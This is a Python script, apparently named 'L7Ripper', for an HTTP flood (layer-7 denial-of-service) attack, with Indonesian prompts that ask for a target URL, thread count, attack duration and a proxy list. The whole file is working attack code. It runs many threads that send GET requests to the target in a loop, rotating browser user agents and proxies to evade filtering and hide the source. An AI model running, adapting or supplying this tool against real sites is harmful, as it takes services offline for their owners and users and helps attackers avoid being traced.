import threading
import requests
import random
import time

class L7Ripper:
    def __init__(self, url, threads, duration, proxies=None):
        self.url = url
        self.threads = threads
        self.duration = duration
        self.proxies = proxies
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        ]

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    def attack(self):
        headers = {
            "User-Agent": self.get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        try:
            if self.proxies:
                proxy = random.choice(self.proxies)
                response = requests.get(self.url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
            else:
                response = requests.get(self.url, headers=headers, timeout=5)
            print(f"Request sent: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    def run(self):
        start_time = time.time()
        while time.time() - start_time < self.duration:
            self.attack()

    def start(self):
        threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=self.run)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    url = input("Masukkan URL target: ")
    threads = int(input("Masukkan jumlah threads: "))
    duration = int(input("Masukkan durasi serangan (detik): "))
    proxy_file = input("Masukkan path ke file proxy (opsional, kosongkan jika tidak ada): ")

    proxies = None
    if proxy_file:
        try:
            with open(proxy_file, "r") as f:
                proxies = [line.strip() for line in f]
        except FileNotFoundError:
            print("File proxy tidak ditemukan.")

    ripper = L7Ripper(url, threads, duration, proxies)
    ripper.start()
